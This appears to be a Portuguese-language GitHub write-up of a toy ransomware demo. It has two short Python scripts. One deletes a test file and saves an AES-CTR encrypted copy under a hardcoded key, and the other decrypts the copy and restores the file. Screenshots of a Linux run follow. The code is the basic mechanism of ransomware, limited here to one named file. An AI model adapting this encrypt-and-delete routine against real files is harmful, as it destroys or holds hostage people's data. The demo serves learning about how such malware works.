!primeiro eu criei o arquivo que iria criptografar

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

!depois eu criei o arquivo que iria ser descriptografado

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

!resultado final

##processo ultilizado no linux

![processo](https://github.com/user-attachments/assets/c4e95bf4-1977-4aa6-9bad-d54582df35cd)


![arquivo criptografado](https://github.com/user-attachments/assets/4b3371b4-e41b-4134-9b9c-28b56758b48e)

 
![arquivo descriptografado](https://github.com/user-attachments/assets/0153e069-b68f-45a6-b860-bb8c4244d612)
